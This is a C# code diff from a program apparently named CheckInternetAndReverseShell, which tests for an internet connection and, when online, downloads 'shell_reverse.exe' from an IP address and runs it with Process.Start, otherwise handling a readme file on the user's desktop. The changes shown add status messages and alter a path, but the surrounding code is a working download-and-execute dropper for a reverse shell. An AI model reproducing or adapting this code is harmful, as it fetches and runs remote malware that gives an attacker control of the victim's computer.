@@ -14,18 +14,20 @@ namespace CheckInternetAndReverseShell
             // Online
             if (isConnected == true)
             {
+                Console.WriteLine("User Online");
                 var filename = "reverseShell";
                 //dowload reverse shell 
                 new WebClient().DownloadFile("http://192.168.222.130/shell_reverse.exe", filename);
-                
+                Console.ReadLine();
                 string path = AppDomain.CurrentDomain.BaseDirectory;
                 // run .exe file
                 System.Diagnostics.Process.Start(path + filename);
-                Console.ReadLine();
+                Console.ReadLine(); 
             }
-            else
+            else 
             {
-                string fileName = @"C:\Users\win7\Desktop\readme.txt";
+                Console.WriteLine("User Offline");
+                string fileName = @"C:\Users\qt\Desktop\readme.txt";
                 // Check if file already exists. If yes, delete it.     
                 if (File.Exists(fileName))
                 {
